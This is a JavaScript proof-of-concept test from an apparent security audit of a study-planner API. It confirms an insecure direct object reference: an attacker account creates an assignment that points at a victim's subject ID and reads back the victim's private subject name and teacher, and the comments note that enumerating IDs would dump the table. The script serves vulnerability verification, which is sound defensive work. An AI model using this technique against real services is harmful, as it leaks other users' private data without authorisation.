// §7.4 CRITICAL — IDOR: an assignment's SubjectId is assigned without ownership check.
// GetAssignments does Include(x=>x.Subject) and returns Subject.Name + Subject.Teacher.
// Attacker A creates an assignment pointing at victim B's subjectId → GET assignments leaks
// B's subject name and teacher. Enumerating ids dumps B's whole subject table.
// Code: StudyService.AddAssignmentAsync:178 (SubjectId=subjectId, NO ownership filter) vs
//       AddScheduleEntryAsync:288 (looks up subject WHERE UserId==userId). GetAssignmentsAsync:160/165.
import { provision, api } from '../_lib/provision.mjs'

const victim = await provision({ email: 'adv.t09.victimb@gmail.com', gender: 'female', studentType: 'student', isWorking: false })
const attacker = await provision({ email: 'adv.t09.attackera@gmail.com', gender: 'male', studentType: 'student', isWorking: false })

// Victim creates a private subject with a secret teacher name.
const vSub = await api('POST', '/api/study/subjects', { token: victim.token, body: {
  name: 'SECRET-Криптографія', teacher: 'SECRET-Викладач Петренко', color: null,
  lectureRoom: null, lectureLink: null, seminarRoom: null, seminarLink: null } })
const victimSubjectId = vSub.json?.id
console.log('victim subjectId =', victimSubjectId, '(name/teacher are private to victim)')

// Attacker cannot GET victim's subjects directly:
const direct = await api('GET', '/api/study/subjects', { token: attacker.token })
console.log('attacker GET /subjects ->', direct.status, 'sees own count=', (direct.json || []).length,
  '(does NOT contain victim subject:', !(direct.json || []).some((s) => s.id === victimSubjectId), ')')

// Attacker creates an assignment referencing the victim's subjectId.
const asg = await api('POST', '/api/study/assignments', { token: attacker.token, body: {
  subjectId: victimSubjectId, type: 'homework', description: 'idor probe',
  deadlineKind: 'tomorrow', dueDate: null, isDone: false, grade: null } })
console.log('attacker POST /assignments {subjectId: victim} ->', asg.status)

// Attacker reads back their assignments — server joins the (foreign) subject.
const got = await api('GET', '/api/study/assignments', { token: attacker.token })
const leaked = (got.json || []).find((a) => a.subjectId === victimSubjectId)
console.log('attacker GET /assignments leaked row:', JSON.stringify(leaked))

const confirmed = asg.status === 200 && leaked &&
  leaked.subjectName === 'SECRET-Криптографія' && leaked.teacher === 'SECRET-Викладач Петренко'
console.log('\n' + (confirmed
  ? 'CONFIRMED — IDOR: attacker leaked victim subject name "' + leaked.subjectName + '" and teacher "' +
    leaked.teacher + '" by referencing a foreign subjectId. Expected: 404/rejection or null join for ' +
    'non-owned subject. Observed: full name+teacher returned. Enumerating subjectId dumps the table.'
  : 'REFUTED — leak did not occur (asg=' + asg.status + ', leaked=' + JSON.stringify(leaked) + ')'))
